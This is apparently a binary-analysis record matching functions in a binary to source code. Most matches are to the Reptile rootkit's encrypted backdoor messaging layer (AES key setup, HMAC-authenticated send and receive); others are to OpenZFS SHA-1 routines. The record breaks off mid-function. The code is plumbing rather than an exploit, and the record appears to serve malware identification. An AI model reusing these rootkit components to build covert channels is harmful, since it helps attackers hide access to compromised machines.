{"file_sha256":"289616b59a145e2033baddb8a8a9b5a8fb01bdbba1b8cf9acadcdd92e6cc0562","base_addr":4294967296,"functions":{"4294978028":{"score":0.81547815,"function_name":"pel_send_all","code":"int pel_send_all(int s, void *buf, size_t len, int flags)\n{\n\tint n;\n\tsize_t sum = 0;\n\tchar *offset = buf;\n\n\twhile (sum \u003c len) {\n\t\tn = send(s, (void *)offset, len - sum, flags);\n\n\t\tif (n \u003c 0) {\n\t\t\tpel_errno = PEL_SYSTEM_ERROR;\n\n\t\t\treturn (PEL_FAILURE);\n\t\t}\n\n\t\tsum += n;\n\n\t\toffset += n;\n\t}\n\n\tpel_errno = PEL_UNDEFINED_ERROR;\n\n\treturn (PEL_SUCCESS);\n}","filepath":"sbin/pel.c","line_number":391,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294978168":{"score":0.8611054,"function_name":"pel_setup_context","code":"void pel_setup_context(struct pel_context *pel_ctx, char *key,\n\t\t       unsigned char IV[20])\n{\n\tint i;\n\tstruct sha1_context sha1_ctx;\n\n\tsha1_starts(\u0026sha1_ctx);\n\tsha1_update(\u0026sha1_ctx, (uint8 *)key, strlen(key));\n\tsha1_update(\u0026sha1_ctx, IV, 20);\n\tsha1_finish(\u0026sha1_ctx, buffer);\n\n\taes_set_key(\u0026pel_ctx-\u003eSK, buffer, 128);\n\n\tmemcpy(pel_ctx-\u003eLCT, IV, 16);\n\n\tmemset(pel_ctx-\u003ek_ipad, 0x36, 64);\n\tmemset(pel_ctx-\u003ek_opad, 0x5C, 64);\n\n\tfor (i = 0; i \u003c 20; i++) {\n\t\tpel_ctx-\u003ek_ipad[i] ^= buffer[i];\n\t\tpel_ctx-\u003ek_opad[i] ^= buffer[i];\n\t}\n\n\tpel_ctx-\u003ep_cntr = 0;\n}","filepath":"sbin/pel.c","line_number":179,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294978444":{"score":0.77290446,"function_name":"pel_send_msg","code":"int pel_send_msg(int sockfd, unsigned char *msg, int length)\n{\n\tunsigned char digest[20];\n\tstruct sha1_context sha1_ctx;\n\tint i, j, ret, blk_len;\n\n\t/* verify the message length */\n\n\tif (length \u003c= 0 || length \u003e BUFSIZE) {\n\t\tpel_errno = PEL_BAD_MSG_LENGTH;\n\n\t\treturn (PEL_FAILURE);\n\t}\n\n\t/* write the message length at start of buffer */\n\n\tbuffer[0] = (length \u003e\u003e 8) \u0026 0xFF;\n\tbuffer[1] = (length)\u00260xFF;\n\n\t/* append the message content */\n\n\tmemcpy(buffer + 2, msg, length);\n\n\t/* round up to AES block length (16 bytes) */\n\n\tblk_len = 2 + length;\n\n\tif ((blk_len \u0026 0x0F) != 0) {\n\t\tblk_len += 16 - (blk_len \u0026 0x0F);\n\t}\n\n\t/* encrypt the buffer with AES-CBC-128 */\n\n\tfor (i = 0; i \u003c blk_len; i += 16) {\n\t\tfor (j = 0; j \u003c 16; j++) {\n\t\t\tbuffer[i + j] ^= send_ctx.LCT[j];\n\t\t}\n\n\t\taes_encrypt(\u0026send_ctx.SK, \u0026buffer[i]);\n\n\t\tmemcpy(send_ctx.LCT, \u0026buffer[i], 16);\n\t}\n\n\t/* compute the HMAC-SHA1 of the ciphertext */\n\n\tbuffer[blk_len] = (send_ctx.p_cntr \u003c\u003c 24) \u0026 0xFF;\n\tbuffer[blk_len + 1] = (send_ctx.p_cntr \u003c\u003c 16) \u0026 0xFF;\n\tbuffer[blk_len + 2] = (send_ctx.p_cntr \u003c\u003c 8) \u0026 0xFF;\n\tbuffer[blk_len + 3] = (send_ctx.p_cntr) \u0026 0xFF;\n\n\tsha1_starts(\u0026sha1_ctx);\n\tsha1_update(\u0026sha1_ctx, send_ctx.k_ipad, 64);\n\tsha1_update(\u0026sha1_ctx, buffer, blk_len + 4);\n\tsha1_finish(\u0026sha1_ctx, digest);\n\n\tsha1_starts(\u0026sha1_ctx);\n\tsha1_update(\u0026sha1_ctx, send_ctx.k_opad, 64);\n\tsha1_update(\u0026sha1_ctx, digest, 20);\n\tsha1_finish(\u0026sha1_ctx, \u0026buffer[blk_len]);\n\n\t/* increment the packet counter */\n\n\tsend_ctx.p_cntr++;\n\n\t/* transmit ciphertext and message authentication code */\n\n\tret = pel_send_all(sockfd, buffer, blk_len + 20, 0);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (PEL_FAILURE);\n\n\tpel_errno = PEL_UNDEFINED_ERROR;\n\n\treturn (PEL_SUCCESS);\n}","filepath":"sbin/pel.c","line_number":207,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294978944":{"score":0.6515548,"function_name":"pel_recv_msg","code":"int pel_recv_msg(int sockfd, unsigned char *msg, int *length)\n{\n\tunsigned char temp[16];\n\tunsigned char hmac[20];\n\tunsigned char digest[20];\n\tstruct sha1_context sha1_ctx;\n\tint i, j, ret, blk_len;\n\n\t/* receive the first encrypted block */\n\n\tret = pel_recv_all(sockfd, buffer, 16, 0);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (PEL_FAILURE);\n\n\t/* decrypt this block and extract the message length */\n\n\tmemcpy(temp, buffer, 16);\n\n\taes_decrypt(\u0026recv_ctx.SK, buffer);\n\n\tfor (j = 0; j \u003c 16; j++) {\n\t\tbuffer[j] ^= recv_ctx.LCT[j];\n\t}\n\n\t*length = (((int)buffer[0]) \u003c\u003c 8) + (int)buffer[1];\n\n\t/* restore the ciphertext */\n\n\tmemcpy(buffer, temp, 16);\n\n\t/* verify the message length */\n\n\tif (*length \u003c= 0 || *length \u003e BUFSIZE) {\n\t\tpel_errno = PEL_BAD_MSG_LENGTH;\n\n\t\treturn (PEL_FAILURE);\n\t}\n\n\t/* round up to AES block length (16 bytes) */\n\n\tblk_len = 2 + *length;\n\n\tif ((blk_len \u0026 0x0F) != 0) {\n\t\tblk_len += 16 - (blk_len \u0026 0x0F);\n\t}\n\n\t/* receive the remaining ciphertext and the mac */\n\n\tret = pel_recv_all(sockfd, \u0026buffer[16], blk_len - 16 + 20, 0);\n\n\tif (ret != PEL_SUCCESS)\n\t\treturn (PEL_FAILURE);\n\n\tmemcpy(hmac, \u0026buffer[blk_len], 20);\n\n\t/* verify the ciphertext integrity */\n\n\tbuffer[blk_len] = (recv_ctx.p_cntr \u003c\u003c 24) \u0026 0xFF;\n\tbuffer[blk_len + 1] = (recv_ctx.p_cntr \u003c\u003c 16) \u0026 0xFF;\n\tbuffer[blk_len + 2] = (recv_ctx.p_cntr \u003c\u003c 8) \u0026 0xFF;\n\tbuffer[blk_len + 3] = (recv_ctx.p_cntr) \u0026 0xFF;\n\n\tsha1_starts(\u0026sha1_ctx);\n\tsha1_update(\u0026sha1_ctx, recv_ctx.k_ipad, 64);\n\tsha1_update(\u0026sha1_ctx, buffer, blk_len + 4);\n\tsha1_finish(\u0026sha1_ctx, digest);\n\n\tsha1_starts(\u0026sha1_ctx);\n\tsha1_update(\u0026sha1_ctx, recv_ctx.k_opad, 64);\n\tsha1_update(\u0026sha1_ctx, digest, 20);\n\tsha1_finish(\u0026sha1_ctx, digest);\n\n\tif (memcmp(hmac, digest, 20) != 0) {\n\t\tpel_errno = PEL_CORRUPTED_DATA;\n\n\t\treturn (PEL_FAILURE);\n\t}\n\n\t/* increment the packet counter */\n\n\trecv_ctx.p_cntr++;\n\n\t/* finally, decrypt and copy the message */\n\n\tfor (i = 0; i \u003c blk_len; i += 16) {\n\t\tmemcpy(temp, \u0026buffer[i], 16);\n\n\t\taes_decrypt(\u0026recv_ctx.SK, \u0026buffer[i]);\n\n\t\tfor (j = 0; j \u003c 16; j++) {\n\t\t\tbuffer[i + j] ^= recv_ctx.LCT[j];\n\t\t}\n\n\t\tmemcpy(recv_ctx.LCT, temp, 16);\n\t}\n\n\tmemcpy(msg, \u0026buffer[2], *length);\n\n\tpel_errno = PEL_UNDEFINED_ERROR;\n\n\treturn (PEL_SUCCESS);\n}","filepath":"sbin/pel.c","line_number":285,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294979972":{"score":0.84547526,"function_name":"pel_recv_all","code":"int pel_recv_all(int s, void *buf, size_t len, int flags)\n{\n\tint n;\n\tsize_t sum = 0;\n\tchar *offset = buf;\n\n\twhile (sum \u003c len) {\n\t\tn = recv(s, (void *)offset, len - sum, flags);\n\n\t\tif (n == 0) {\n\t\t\tpel_errno = PEL_CONN_CLOSED;\n\n\t\t\treturn (PEL_FAILURE);\n\t\t}\n\n\t\tif (n \u003c 0) {\n\t\t\tpel_errno = PEL_SYSTEM_ERROR;\n\n\t\t\treturn (PEL_FAILURE);\n\t\t}\n\n\t\tsum += n;\n\n\t\toffset += n;\n\t}\n\n\tpel_errno = PEL_UNDEFINED_ERROR;\n\n\treturn (PEL_SUCCESS);\n}","filepath":"sbin/pel.c","line_number":416,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294980124":{"score":0.89505297,"function_name":"aes_set_key","code":"int aes_set_key(struct aes_context *ctx, uint8 *key, int nbits)\n{\n\tint i;\n\tuint32 *RK;\n\n\tswitch (nbits) {\n\tcase 128:\n\t\tctx-\u003enr = 10;\n\t\tbreak;\n\tcase 192:\n\t\tctx-\u003enr = 12;\n\t\tbreak;\n\tcase 256:\n\t\tctx-\u003enr = 14;\n\t\tbreak;\n\tdefault:\n\t\treturn (1);\n\t}\n\n\tRK = ctx-\u003eerk;\n\n\tfor (i = 0; i \u003c (nbits \u003e\u003e 5); i++) {\n\t\tGET_UINT32(RK[i], key, i * 4);\n\t}\n\n\t/* setup encryption round keys */\n\n\tswitch (nbits) {\n\tcase 128:\n\n\t\tfor (i = 0; i \u003c 10; i++, RK += 4) {\n\t\t\tRK[4] = RK[0] ^ RCON[i] ^\n\t\t\t\t(FSb[(uint8)(RK[3] \u003e\u003e 16)] \u003c\u003c 24) ^\n\t\t\t\t(FSb[(uint8)(RK[3] \u003e\u003e 8)] \u003c\u003c 16) ^\n\t\t\t\t(FSb[(uint8)(RK[3])] \u003c\u003c 8) ^\n\t\t\t\t(FSb[(uint8)(RK[3] \u003e\u003e 24)]);\n\n\t\t\tRK[5] = RK[1] ^ RK[4];\n\t\t\tRK[6] = RK[2] ^ RK[5];\n\t\t\tRK[7] = RK[3] ^ RK[6];\n\t\t}\n\t\tbreak;\n\n\tcase 192:\n\n\t\tfor (i = 0; i \u003c 8; i++, RK += 6) {\n\t\t\tRK[6] = RK[0] ^ RCON[i] ^\n\t\t\t\t(FSb[(uint8)(RK[5] \u003e\u003e 16)] \u003c\u003c 24) ^\n\t\t\t\t(FSb[(uint8)(RK[5] \u003e\u003e 8)] \u003c\u003c 16) ^\n\t\t\t\t(FSb[(uint8)(RK[5])] \u003c\u003c 8) ^\n\t\t\t\t(FSb[(uint8)(RK[5] \u003e\u003e 24)]);\n\n\t\t\tRK[7] = RK[1] ^ RK[6];\n\t\t\tRK[8] = RK[2] ^ RK[7];\n\t\t\tRK[9] = RK[3] ^ RK[8];\n\t\t\tRK[10] = RK[4] ^ RK[9];\n\t\t\tRK[11] = RK[5] ^ RK[10];\n\t\t}\n\t\tbreak;\n\n\tcase 256:\n\n\t\tfor (i = 0; i \u003c 7; i++, RK += 8) {\n\t\t\tRK[8] = RK[0] ^ RCON[i] ^\n\t\t\t\t(FSb[(uint8)(RK[7] \u003e\u003e 16)] \u003c\u003c 24) ^\n\t\t\t\t(FSb[(uint8)(RK[7] \u003e\u003e 8)] \u003c\u003c 16) ^\n\t\t\t\t(FSb[(uint8)(RK[7])] \u003c\u003c 8) ^\n\t\t\t\t(FSb[(uint8)(RK[7] \u003e\u003e 24)]);\n\n\t\t\tRK[9] = RK[1] ^ RK[8];\n\t\t\tRK[10] = RK[2] ^ RK[9];\n\t\t\tRK[11] = RK[3] ^ RK[10];\n\n\t\t\tRK[12] = RK[4] ^ (FSb[(uint8)(RK[11] \u003e\u003e 24)] \u003c\u003c 24) ^\n\t\t\t\t (FSb[(uint8)(RK[11] \u003e\u003e 16)] \u003c\u003c 16) ^\n\t\t\t\t (FSb[(uint8)(RK[11] \u003e\u003e 8)] \u003c\u003c 8) ^\n\t\t\t\t (FSb[(uint8)(RK[11])]);\n\n\t\t\tRK[13] = RK[5] ^ RK[12];\n\t\t\tRK[14] = RK[6] ^ RK[13];\n\t\t\tRK[15] = RK[7] ^ RK[14];\n\t\t}\n\t\tbreak;\n\t}\n\n\t/* setup decryption round keys */\n\n\tfor (i = 0; i \u003c= ctx-\u003enr; i++) {\n\t\tctx-\u003edrk[i * 4] = ctx-\u003eerk[(ctx-\u003enr - i) * 4];\n\t\tctx-\u003edrk[i * 4 + 1] = ctx-\u003eerk[(ctx-\u003enr - i) * 4 + 1];\n\t\tctx-\u003edrk[i * 4 + 2] = ctx-\u003eerk[(ctx-\u003enr - i) * 4 + 2];\n\t\tctx-\u003edrk[i * 4 + 3] = ctx-\u003eerk[(ctx-\u003enr - i) * 4 + 3];\n\t}\n\n\tfor (i = 1, RK = ctx-\u003edrk + 4; i \u003c ctx-\u003enr; i++, RK += 4) {\n\t\tRK[0] = RT0[FSb[(uint8)(RK[0] \u003e\u003e 24)]] ^\n\t\t\tRT1[FSb[(uint8)(RK[0] \u003e\u003e 16)]] ^\n\t\t\tRT2[FSb[(uint8)(RK[0] \u003e\u003e 8)]] ^\n\t\t\tRT3[FSb[(uint8)(RK[0])]];\n\n\t\tRK[1] = RT0[FSb[(uint8)(RK[1] \u003e\u003e 24)]] ^\n\t\t\tRT1[FSb[(uint8)(RK[1] \u003e\u003e 16)]] ^\n\t\t\tRT2[FSb[(uint8)(RK[1] \u003e\u003e 8)]] ^\n\t\t\tRT3[FSb[(uint8)(RK[1])]];\n\n\t\tRK[2] = RT0[FSb[(uint8)(RK[2] \u003e\u003e 24)]] ^\n\t\t\tRT1[FSb[(uint8)(RK[2] \u003e\u003e 16)]] ^\n\t\t\tRT2[FSb[(uint8)(RK[2] \u003e\u003e 8)]] ^\n\t\t\tRT3[FSb[(uint8)(RK[2])]];\n\n\t\tRK[3] = RT0[FSb[(uint8)(RK[3] \u003e\u003e 24)]] ^\n\t\t\tRT1[FSb[(uint8)(RK[3] \u003e\u003e 16)]] ^\n\t\t\tRT2[FSb[(uint8)(RK[3] \u003e\u003e 8)]] ^\n\t\t\tRT3[FSb[(uint8)(RK[3])]];\n\t}\n\n\treturn (0);\n}","filepath":"sbin/aes.c","line_number":300,"entry_url":"https://github.com/f0rb1dd3n/Reptile.git","slot_name":"2.0"},"4294987372":{"score":0.95176286,"function_name":"SHA1Init","code":"void\nSHA1Init(SHA1_CTX *ctx)\n{\n\tctx-\u003ecount[0] = ctx-\u003ecount[1] = 0;\n\n\t/*\n\t * load magic initialization constants. Tell lint\n\t * that these constants are unsigned by using U.\n\t */\n\n\tctx-\u003estate[0] = 0x67452301U;\n\tctx-\u003estate[1] = 0xefcdab89U;\n\tctx-\u003estate[2] = 0x98badcfeU;\n\tctx-\u003estate[3] = 0x10325476U;\n\tctx-\u003estate[4] = 0xc3d2e1f0U;\n}","filepath":"module/icp/algs/sha1/sha1.c","line_number":91,"entry_url":"https://github.com/openzfs/zfs.git","slot_name":"zfs-2.0.0-rc1"},"4294987432":{"score":0.86200386,"function_name":"SHA1Transform","code":"void /* CSTYLED */\nSHA1Transform(SHA1_CTX *ctx, const uint8_t blk[64])\n{\n\t/* CSTYLED */\n\tsha1word a = ctx-\u003estate[0];\n\tsha1word b = ctx-\u003estate[1];\n\tsha1word c = ctx-\u003estate[2];\n\tsha1word d = ctx-\u003estate[3];\n\tsha1word e = ctx-\u003estate[4];\n\n#if\tdefined(W_ARRAY)\n\tsha1word\tw[16];\n#else\t/* !defined(W_ARRAY) */\n\tsha1word\tw_0, w_1, w_2,  w_3,  w_4,  w_5,  w_6,  w_7;\n\tsha1word\tw_8, w_9, w_10, w_11, w_12, w_13, w_14, w_15;\n#endif\t/* !defined(W_ARRAY) */\n\n\tW(0)  = LOAD_BIG_32((void *)(blk +  0));\n\tW(1)  = LOAD_BIG_32((void *)(blk +  4));\n\tW(2)  = LOAD_BIG_32((void *)(blk +  8));\n\tW(3)  = LOAD_BIG_32((void *)(blk + 12));\n\tW(4)  = LOAD_BIG_32((void *)(blk + 16));\n\tW(5)  = LOAD_BIG_32((void *)(blk + 20));\n\tW(6)  = LOAD_BIG_32((void *)(blk + 24));\n\tW(7)  = LOAD_BIG_32((void *)(blk + 28));\n\tW(8)  = LOAD_BIG_32((void *)(blk + 32));\n\tW(9)  = LOAD_BIG_32((void *)(blk + 36));\n\tW(10) = LOAD_BIG_32((void *)(blk + 40));\n\tW(11) = LOAD_BIG_32((void *)(blk + 44));\n\tW(12) = LOAD_BIG_32((void *)(blk + 48));\n\tW(13) = LOAD_BIG_32((void *)(blk + 52));\n\tW(14) = LOAD_BIG_32((void *)(blk + 56));\n\tW(15) = LOAD_BIG_32((void *)(blk + 60));\n\n#endif /* !defined(__sparc) */\n\n\t/*\n\t * general optimization:\n\t *\n\t * even though this approach is described in the standard as\n\t * being slower algorithmically, it is 30-40% faster than the\n\t * \"faster\" version under SPARC, because this version has more\n\t * of the constraints specified at compile-time and uses fewer\n\t * variables (and therefore has better register utilization)\n\t * than its \"speedier\" brother.  (i've tried both, trust me)\n\t *\n\t * for either method given in the spec, there is an \"assignment\"\n\t * phase where the following takes place:\n\t *\n\t *\ttmp = (main_computation);\n\t *\te = d; d = c; c = rotate_left(b, 30); b = a; a = tmp;\n\t *\n\t * we can make the algorithm go faster by not doing this work,\n\t * but just pretending that `d' is now `e', etc. this works\n\t * really well and obviates the need for a temporary variable.\n\t * however, we still explicitly perform the rotate action,\n\t * since it is cheaper on SPARC to do it once than to have to\n\t * do it over and over again.\n\t */\n\n\t/* round 1 */\n\te = ROTATE_LEFT(a, 5) + F(b, c, d) + e + W(0) + SHA1_CONST(0); /* 0 */\n\tb = ROTATE_LEFT(b, 30);\n\n\td = ROTATE_LEFT(e, 5) + F(a, b, c) + d + W(1) + SHA1_CONST(0); /* 1 */\n\ta = ROTATE_LEFT(a, 30);\n\n\tc = ROTATE_LEFT(d, 5) + F(e, a, b) + c + W(2) + SHA1_CONST(0); /* 2 */\n\te = ROTATE_LEFT(e, 30);\n\n\tb = ROTATE_LEFT(c, 5) + F(d, e, a) + b + W(3) + SHA1_CONST(0); /* 3 */\n\td = ROTATE_LEFT(d, 30);\n\n\ta = ROTATE_LEFT(b, 5) + F(c, d, e) + a + W(4) + SHA1_CONST(0); /* 4 */\n\tc = ROTATE_LEFT(c, 30);\n\n\te = ROTATE_LEFT(a, 5) + F(b, c, d) + e + W(5) + SHA1_CONST(0); /* 5 */\n\tb = ROTATE_LEFT(b, 30);\n\n\td = ROTATE_LEFT(e, 5) + F(a, b, c) + d + W(6) + SHA1_CONST(0); /* 6 */\n\ta = ROTATE_LEFT(a, 30);\n\n\tc = ROTATE_LEFT(d, 5) + F(e, a, b) + c + W(7) + SHA1_CONST(0); /* 7 */\n\te = ROTATE_LEFT(e, 30);\n\n\tb = ROTATE_LEFT(c, 5) + F(d, e, a) + b + W(8) + SHA1_CONST(0); /* 8 */\n\td = ROTATE_LEFT(d, 30);\n\n\ta = ROTATE_LEFT(b, 5) + F(c, d, e) + a + W(9) + SHA1_CONST(0); /* 9 */\n\tc = ROTATE_LEFT(c, 30);\n\n\te = ROTATE_LEFT(a, 5) + F(b, c, d) + e + W(10) + SHA1_CONST(0); /* 10 */\n\tb = ROTATE_LEFT(b, 30);\n\n\td = ROTATE_LEFT(e, 5) + F(a, b, c) + d + W(11) + SHA1_CONST(0); /* 11 */\n\ta = ROTATE_LEFT(a, 30);\n\n\tc = ROTATE_LEFT(d, 5) + F(e, a, b) + c + W(12) + SHA1_CONST(0); /* 12 */\n\te = ROTATE_LEFT(e, 30);\n\n\tb = ROTATE_LEFT(c, 5) + F(d, e, a) + b + W(13) + SHA1_CONST(0); /* 13 */\n\td = ROTATE_LEFT(d, 30);\n\n\ta = ROTATE_LEFT(b, 5) + F(c, d, e) + a + W(14) + SHA1_CONST(0); /* 14 */\n\tc = ROTATE_LEFT(c, 30);\n\n\te = ROTATE_LEFT(a, 5) + F(b, c, d) + e + W(15) + SHA1_CONST(0); /* 15 */\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(0) = ROTATE_LEFT((W(13) ^ W(8) ^ W(2) ^ W(0)), 1);\t\t/* 16 */\n\td = ROTATE_LEFT(e, 5) + F(a, b, c) + d + W(0) + SHA1_CONST(0);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(1) = ROTATE_LEFT((W(14) ^ W(9) ^ W(3) ^ W(1)), 1);\t\t/* 17 */\n\tc = ROTATE_LEFT(d, 5) + F(e, a, b) + c + W(1) + SHA1_CONST(0);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(2) = ROTATE_LEFT((W(15) ^ W(10) ^ W(4) ^ W(2)), 1);\t/* 18 */\n\tb = ROTATE_LEFT(c, 5) + F(d, e, a) + b + W(2) + SHA1_CONST(0);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(3) = ROTATE_LEFT((W(0) ^ W(11) ^ W(5) ^ W(3)), 1);\t\t/* 19 */\n\ta = ROTATE_LEFT(b, 5) + F(c, d, e) + a + W(3) + SHA1_CONST(0);\n\tc = ROTATE_LEFT(c, 30);\n\n\t/* round 2 */\n\tW(4) = ROTATE_LEFT((W(1) ^ W(12) ^ W(6) ^ W(4)), 1);\t\t/* 20 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(4) + SHA1_CONST(1);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(5) = ROTATE_LEFT((W(2) ^ W(13) ^ W(7) ^ W(5)), 1);\t\t/* 21 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(5) + SHA1_CONST(1);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(6) = ROTATE_LEFT((W(3) ^ W(14) ^ W(8) ^ W(6)), 1);\t\t/* 22 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(6) + SHA1_CONST(1);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(7) = ROTATE_LEFT((W(4) ^ W(15) ^ W(9) ^ W(7)), 1);\t\t/* 23 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(7) + SHA1_CONST(1);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(8) = ROTATE_LEFT((W(5) ^ W(0) ^ W(10) ^ W(8)), 1);\t\t/* 24 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(8) + SHA1_CONST(1);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(9) = ROTATE_LEFT((W(6) ^ W(1) ^ W(11) ^ W(9)), 1);\t\t/* 25 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(9) + SHA1_CONST(1);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(10) = ROTATE_LEFT((W(7) ^ W(2) ^ W(12) ^ W(10)), 1);\t/* 26 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(10) + SHA1_CONST(1);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(11) = ROTATE_LEFT((W(8) ^ W(3) ^ W(13) ^ W(11)), 1);\t/* 27 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(11) + SHA1_CONST(1);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(12) = ROTATE_LEFT((W(9) ^ W(4) ^ W(14) ^ W(12)), 1);\t/* 28 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(12) + SHA1_CONST(1);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(13) = ROTATE_LEFT((W(10) ^ W(5) ^ W(15) ^ W(13)), 1);\t/* 29 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(13) + SHA1_CONST(1);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(14) = ROTATE_LEFT((W(11) ^ W(6) ^ W(0) ^ W(14)), 1);\t/* 30 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(14) + SHA1_CONST(1);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(15) = ROTATE_LEFT((W(12) ^ W(7) ^ W(1) ^ W(15)), 1);\t/* 31 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(15) + SHA1_CONST(1);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(0) = ROTATE_LEFT((W(13) ^ W(8) ^ W(2) ^ W(0)), 1);\t\t/* 32 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(0) + SHA1_CONST(1);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(1) = ROTATE_LEFT((W(14) ^ W(9) ^ W(3) ^ W(1)), 1);\t\t/* 33 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(1) + SHA1_CONST(1);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(2) = ROTATE_LEFT((W(15) ^ W(10) ^ W(4) ^ W(2)), 1);\t/* 34 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(2) + SHA1_CONST(1);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(3) = ROTATE_LEFT((W(0) ^ W(11) ^ W(5) ^ W(3)), 1);\t\t/* 35 */\n\te = ROTATE_LEFT(a, 5) + G(b, c, d) + e + W(3) + SHA1_CONST(1);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(4) = ROTATE_LEFT((W(1) ^ W(12) ^ W(6) ^ W(4)), 1);\t\t/* 36 */\n\td = ROTATE_LEFT(e, 5) + G(a, b, c) + d + W(4) + SHA1_CONST(1);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(5) = ROTATE_LEFT((W(2) ^ W(13) ^ W(7) ^ W(5)), 1);\t\t/* 37 */\n\tc = ROTATE_LEFT(d, 5) + G(e, a, b) + c + W(5) + SHA1_CONST(1);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(6) = ROTATE_LEFT((W(3) ^ W(14) ^ W(8) ^ W(6)), 1);\t\t/* 38 */\n\tb = ROTATE_LEFT(c, 5) + G(d, e, a) + b + W(6) + SHA1_CONST(1);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(7) = ROTATE_LEFT((W(4) ^ W(15) ^ W(9) ^ W(7)), 1);\t\t/* 39 */\n\ta = ROTATE_LEFT(b, 5) + G(c, d, e) + a + W(7) + SHA1_CONST(1);\n\tc = ROTATE_LEFT(c, 30);\n\n\t/* round 3 */\n\tW(8) = ROTATE_LEFT((W(5) ^ W(0) ^ W(10) ^ W(8)), 1);\t\t/* 40 */\n\te = ROTATE_LEFT(a, 5) + H(b, c, d) + e + W(8) + SHA1_CONST(2);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(9) = ROTATE_LEFT((W(6) ^ W(1) ^ W(11) ^ W(9)), 1);\t\t/* 41 */\n\td = ROTATE_LEFT(e, 5) + H(a, b, c) + d + W(9) + SHA1_CONST(2);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(10) = ROTATE_LEFT((W(7) ^ W(2) ^ W(12) ^ W(10)), 1);\t/* 42 */\n\tc = ROTATE_LEFT(d, 5) + H(e, a, b) + c + W(10) + SHA1_CONST(2);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(11) = ROTATE_LEFT((W(8) ^ W(3) ^ W(13) ^ W(11)), 1);\t/* 43 */\n\tb = ROTATE_LEFT(c, 5) + H(d, e, a) + b + W(11) + SHA1_CONST(2);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(12) = ROTATE_LEFT((W(9) ^ W(4) ^ W(14) ^ W(12)), 1);\t/* 44 */\n\ta = ROTATE_LEFT(b, 5) + H(c, d, e) + a + W(12) + SHA1_CONST(2);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(13) = ROTATE_LEFT((W(10) ^ W(5) ^ W(15) ^ W(13)), 1);\t/* 45 */\n\te = ROTATE_LEFT(a, 5) + H(b, c, d) + e + W(13) + SHA1_CONST(2);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(14) = ROTATE_LEFT((W(11) ^ W(6) ^ W(0) ^ W(14)), 1);\t/* 46 */\n\td = ROTATE_LEFT(e, 5) + H(a, b, c) + d + W(14) + SHA1_CONST(2);\n\ta = ROTATE_LEFT(a, 30);\n\n\tW(15) = ROTATE_LEFT((W(12) ^ W(7) ^ W(1) ^ W(15)), 1);\t/* 47 */\n\tc = ROTATE_LEFT(d, 5) + H(e, a, b) + c + W(15) + SHA1_CONST(2);\n\te = ROTATE_LEFT(e, 30);\n\n\tW(0) = ROTATE_LEFT((W(13) ^ W(8) ^ W(2) ^ W(0)), 1);\t\t/* 48 */\n\tb = ROTATE_LEFT(c, 5) + H(d, e, a) + b + W(0) + SHA1_CONST(2);\n\td = ROTATE_LEFT(d, 30);\n\n\tW(1) = ROTATE_LEFT((W(14) ^ W(9) ^ W(3) ^ W(1)), 1);\t\t/* 49 */\n\ta = ROTATE_LEFT(b, 5) + H(c, d, e) + a + W(1) + SHA1_CONST(2);\n\tc = ROTATE_LEFT(c, 30);\n\n\tW(2) = ROTATE_LEFT((W(15) ^ W(10) ^ W(4) ^ W(2)), 1);\t/* 50 */\n\te = ROTATE_LEFT(a, 5) + H(b, c, d) + e + W(2) + SHA1_CONST(2);\n\tb = ROTATE_LEFT(b, 30);\n\n\tW(3) = ROTATE_LEFT((W(0) ^ W(11) ^ W(5) ^ W(3)), 1);\t\t/* 51 */\n\td = ROTATE_LEFT(e, 5) + H(a, b, c) + d + W(3) + SHA1_CONST(2);\n\ta = ROTATE_LEFT(a, 